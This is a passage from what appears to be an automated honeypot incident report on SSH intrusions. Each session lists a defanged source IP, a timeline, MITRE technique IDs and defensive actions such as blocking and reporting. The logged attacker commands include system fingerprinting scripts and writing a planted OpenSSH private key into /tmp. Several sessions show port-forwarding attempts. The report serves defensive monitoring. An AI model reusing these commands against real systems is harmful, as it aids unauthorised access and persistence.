| **First Seen** | 2026-09-01 19:55 |
| **Last Seen** | 2026-09-01 19:58 |
| **Session Duration** | 176s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:55:23` | `cowrie.session.connect` |
| `2026-09-01 19:55:23` | `cowrie.client.version` |
| `2026-09-01 19:55:23` | `cowrie.client.kex` |
| `2026-09-01 19:55:25` | `cowrie.login.failed` |
| `2026-09-01 19:55:26` | `cowrie.login.success` |
| `2026-09-01 19:55:27` | `cowrie.session.params` |
| `2026-09-01 19:55:27` | `cowrie.command.input` |
| `2026-09-01 19:55:27` | `cowrie.command.failed` |
| `2026-09-01 19:55:28` | `cowrie.log.closed` |
| `2026-09-01 19:55:28` | `cowrie.session.params` |
| `2026-09-01 19:55:28` | `cowrie.command.input` |
| `2026-09-01 19:55:28` | `cowrie.log.closed` |
| `2026-09-01 19:55:29` | `cowrie.session.params` |
| `2026-09-01 19:55:29` | `cowrie.command.input` |
| `2026-09-01 19:55:29` | `cowrie.log.closed` |
| `2026-09-01 19:55:30` | `cowrie.session.params` |
| `2026-09-01 19:55:30` | `cowrie.command.input` |
| `2026-09-01 19:55:31` | `cowrie.log.closed` |
| `2026-09-01 19:55:31` | `cowrie.session.params` |
| `2026-09-01 19:55:31` | `cowrie.command.input` |
| `2026-09-01 19:55:32` | `cowrie.log.closed` |
| `2026-09-01 19:55:32` | `cowrie.session.params` |
| `2026-09-01 19:55:32` | `cowrie.command.input` |
| `2026-09-01 19:55:33` | `cowrie.log.closed` |
| `2026-09-01 19:55:33` | `cowrie.session.params` |
| `2026-09-01 19:55:33` | `cowrie.command.input` |
| `2026-09-01 19:55:34` | `cowrie.log.closed` |
| `2026-09-01 19:55:34` | `cowrie.session.params` |
| `2026-09-01 19:55:34` | `cowrie.command.input` |
| `2026-09-01 19:55:35` | `cowrie.log.closed` |
| `2026-09-01 19:55:36` | `cowrie.session.params` |
| `2026-09-01 19:55:36` | `cowrie.command.input` |
| `2026-09-01 19:55:36` | `cowrie.log.closed` |
| `2026-09-01 19:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.163.187[.]76` to AbuseIPDB if not already reported
- [ ] Block `193.163.187[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60408a9bb5a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:56 |
| **Last Seen** | 2026-09-01 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:56:46` | `cowrie.session.connect` |
| `2026-09-01 19:56:46` | `cowrie.client.version` |
| `2026-09-01 19:56:46` | `cowrie.client.kex` |
| `2026-09-01 19:56:47` | `cowrie.login.success` |
| `2026-09-01 19:56:48` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:56:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:56:48` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8346f0041d4d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:04 |
| **Last Seen** | 2026-09-01 20:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:04:03` | `cowrie.session.connect` |
| `2026-09-01 20:04:03` | `cowrie.client.version` |
| `2026-09-01 20:04:03` | `cowrie.client.kex` |
| `2026-09-01 20:04:05` | `cowrie.login.success` |
| `2026-09-01 20:04:05` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:04:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:04:05` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a058a0f44a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:06 |
| **Last Seen** | 2026-09-01 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:06:29` | `cowrie.session.connect` |
| `2026-09-01 20:06:29` | `cowrie.client.version` |
| `2026-09-01 20:06:29` | `cowrie.client.kex` |
| `2026-09-01 20:06:30` | `cowrie.login.success` |
| `2026-09-01 20:06:30` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:06:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:06:30` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2ea648a8da2

| Field | Detail |
|---|---|
| **Source IP** | `39.107.142[.]38` |
| **First Seen** | 2026-09-01 20:07 |
| **Last Seen** | 2026-09-01 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:07:06` | `cowrie.session.connect` |
| `2026-09-01 20:07:06` | `cowrie.client.version` |
| `2026-09-01 20:07:06` | `cowrie.client.kex` |
| `2026-09-01 20:07:06` | `cowrie.login.success` |
| `2026-09-01 20:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.107.142[.]38` to AbuseIPDB if not already reported
- [ ] Block `39.107.142[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04cf90e23027

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-01 20:07 |
| **Last Seen** | 2026-09-01 20:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:07:07` | `cowrie.session.connect` |
| `2026-09-01 20:07:07` | `cowrie.client.version` |
| `2026-09-01 20:07:07` | `cowrie.client.kex` |
| `2026-09-01 20:07:07` | `cowrie.login.success` |
| `2026-09-01 20:07:09` | `cowrie.session.params` |
| `2026-09-01 20:07:09` | `cowrie.command.input` |
| `2026-09-01 20:07:09` | `cowrie.session.file_download` |
| `2026-09-01 20:07:09` | `cowrie.session.file_download` |
| `2026-09-01 20:07:09` | `cowrie.log.closed` |
| `2026-09-01 20:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826fe0ddaa8c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:15 |
| **Last Seen** | 2026-09-01 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:15:09` | `cowrie.session.connect` |
| `2026-09-01 20:15:09` | `cowrie.client.version` |
| `2026-09-01 20:15:09` | `cowrie.client.kex` |
| `2026-09-01 20:15:11` | `cowrie.login.success` |
| `2026-09-01 20:15:11` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:15:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:15:11` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1074990ab826

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:16 |
| **Last Seen** | 2026-09-01 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:16:24` | `cowrie.session.connect` |
| `2026-09-01 20:16:24` | `cowrie.client.version` |
| `2026-09-01 20:16:24` | `cowrie.client.kex` |
| `2026-09-01 20:16:25` | `cowrie.login.success` |
| `2026-09-01 20:16:25` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:16:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:16:25` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-180e746db491

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:25 |
| **Last Seen** | 2026-09-01 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:25:52` | `cowrie.session.connect` |
| `2026-09-01 20:25:52` | `cowrie.client.version` |
| `2026-09-01 20:25:52` | `cowrie.client.kex` |
| `2026-09-01 20:25:53` | `cowrie.login.success` |
| `2026-09-01 20:25:53` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:25:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:25:53` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b72c533e5c4e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:25 |
| **Last Seen** | 2026-09-01 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:25:54` | `cowrie.session.connect` |
| `2026-09-01 20:25:54` | `cowrie.client.version` |
| `2026-09-01 20:25:54` | `cowrie.client.kex` |
| `2026-09-01 20:25:55` | `cowrie.login.success` |
| `2026-09-01 20:25:55` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:25:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:25:55` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81db2344b646

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]57` |
| **First Seen** | 2026-09-01 20:27 |
| **Last Seen** | 2026-09-01 20:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:27:45` | `cowrie.session.connect` |
| `2026-09-01 20:27:45` | `cowrie.client.version` |
| `2026-09-01 20:27:45` | `cowrie.client.kex` |
| `2026-09-01 20:27:47` | `cowrie.client.fingerprint` |
| `2026-09-01 20:27:47` | `cowrie.login.failed` |
| `2026-09-01 20:27:48` | `cowrie.login.success` |
| `2026-09-01 20:28:06` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:28:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-01 20:28:06` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]57` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d6ce595a60

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:35 |
| **Last Seen** | 2026-09-01 20:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:35:43` | `cowrie.session.connect` |
| `2026-09-01 20:35:43` | `cowrie.client.version` |
| `2026-09-01 20:35:43` | `cowrie.client.kex` |
| `2026-09-01 20:35:44` | `cowrie.login.success` |
| `2026-09-01 20:35:44` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:35:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:35:45` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa27ccca07fd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:36 |
| **Last Seen** | 2026-09-01 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:36:57` | `cowrie.session.connect` |
| `2026-09-01 20:36:57` | `cowrie.client.version` |
| `2026-09-01 20:36:57` | `cowrie.client.kex` |
| `2026-09-01 20:36:58` | `cowrie.login.success` |
| `2026-09-01 20:36:58` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:36:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:36:59` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ee9b8f7c47

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 20:37 |
| **Last Seen** | 2026-09-01 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:37:36` | `cowrie.session.connect` |
| `2026-09-01 20:37:36` | `cowrie.client.version` |
| `2026-09-01 20:37:36` | `cowrie.client.kex` |
| `2026-09-01 20:37:36` | `cowrie.login.success` |
| `2026-09-01 20:37:36` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:37:37` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4375c9ccd5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-01 20:38 |
| **Last Seen** | 2026-09-01 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:38:46` | `cowrie.session.connect` |
| `2026-09-01 20:38:46` | `cowrie.client.version` |
| `2026-09-01 20:38:46` | `cowrie.client.kex` |
| `2026-09-01 20:38:47` | `cowrie.login.success` |
| `2026-09-01 20:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351602abf98c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-01 20:38 |
| **Last Seen** | 2026-09-01 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:38:46` | `cowrie.session.connect` |
| `2026-09-01 20:38:46` | `cowrie.client.version` |
| `2026-09-01 20:38:47` | `cowrie.client.kex` |
| `2026-09-01 20:38:47` | `cowrie.login.success` |
| `2026-09-01 20:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ca26fb8921b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:41 |
| **Last Seen** | 2026-09-01 20:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:41:47` | `cowrie.session.connect` |
| `2026-09-01 20:41:47` | `cowrie.client.version` |
| `2026-09-01 20:41:47` | `cowrie.client.kex` |
| `2026-09-01 20:41:50` | `cowrie.login.success` |
| `2026-09-01 20:41:53` | `cowrie.session.params` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.success` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.command.input` |
| `2026-09-01 20:41:53` | `cowrie.log.closed` |
| `2026-09-01 20:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b9068919c1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:43 |
| **Last Seen** | 2026-09-01 20:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:43:40` | `cowrie.session.connect` |
| `2026-09-01 20:43:41` | `cowrie.client.version` |
| `2026-09-01 20:43:41` | `cowrie.client.kex` |
| `2026-09-01 20:43:45` | `cowrie.login.success` |
| `2026-09-01 20:43:47` | `cowrie.session.params` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.success` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:47` | `cowrie.command.input` |
| `2026-09-01 20:43:49` | `cowrie.log.closed` |
| `2026-09-01 20:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b12cb8bf28ab

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 20:45 |
| **Last Seen** | 2026-09-01 20:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 20:45:28` | `cowrie.session.connect` |
| `2026-09-01 20:45:28` | `cowrie.client.version` |
| `2026-09-01 20:45:29` | `cowrie.client.kex` |
| `2026-09-01 20:45:31` | `cowrie.login.success` |
| `2026-09-01 20:45:31` | `cowrie.direct-tcpip.request` |
| `2026-09-01 20:45:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 20:45:31` | `cowrie.direct-tcpip.data` |
| `2026-09-01 20:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db29630a355

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 20:45 |
| **Last Seen** | 2026-09-01 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
